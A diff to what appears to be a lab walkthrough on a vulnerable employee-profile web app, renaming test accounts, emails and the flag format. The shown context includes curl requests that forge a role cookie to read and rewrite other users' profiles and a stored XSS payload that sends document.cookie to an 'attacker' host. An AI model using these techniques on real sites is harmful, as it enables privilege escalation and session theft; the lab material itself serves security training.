@@ -52,7 +52,7 @@ A realistic engagement combining all four stages. The app:
 - Profile management at `/profile` (UI) and `/profile/api.php/profile/<id>` (API)
 - Edit-profile via PUT to the API
 - Create-user / delete-user gated by `role=admin` cookie check on the back-end
-- Test account: `htb-student` with `uid=1`, role `employee`
+- Test account: `student` with `uid=1`, role `employee`
 
 ### Step 0 - Reconnaissance
 
@@ -152,7 +152,7 @@ $ curl -sb 'PHPSESSID=mine;role=employee' \
     "uuid": "4a9bd19b3b8676199592a346051f950c",
     "role": "employee",
     "full_name": "Iona Franklyn",
-    "email": "i_franklyn@employees.htb",
+    "email": "i_franklyn@employees.local",
     "about": "..."
 }
 ```
@@ -181,8 +181,8 @@ $ jq 'select(.role != "employee")' all-profiles.json
     "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
     "role": "web_admin",
     "full_name": "administrator",
-    "email": "webadmin@employees.htb",
-    "about": "HTB{this_isnt_the_real_flag}"
+    "email": "webadmin@employees.local",
+    "about": "FLAG{this_isnt_the_real_flag}"
 }
 ```
 
@@ -207,7 +207,7 @@ $ curl -sb 'PHPSESSID=mine;role=employee' \
          "uuid": "40f5888b67c748df7efba008e7c2f9d2",
          "role": "web_admin",
          "full_name": "Amy Lindon",
-         "email": "a_lindon@employees.htb",
+         "email": "a_lindon@employees.local",
          "about": "..."
        }'
 # {"success": true}
@@ -311,7 +311,7 @@ $ curl -sb 'PHPSESSID=mine;role=web_admin' \
          \"uuid\": \"a36fa9e66e85f2dd6f5e13cad45248ae\",
          \"role\": \"web_admin\",
          \"full_name\": \"administrator\",
-         \"email\": \"webadmin@employees.htb\",
+         \"email\": \"webadmin@employees.local\",
          \"about\": \"<script>fetch('http://attacker:8000/?c='+document.cookie)</script>\"
        }"
 ```
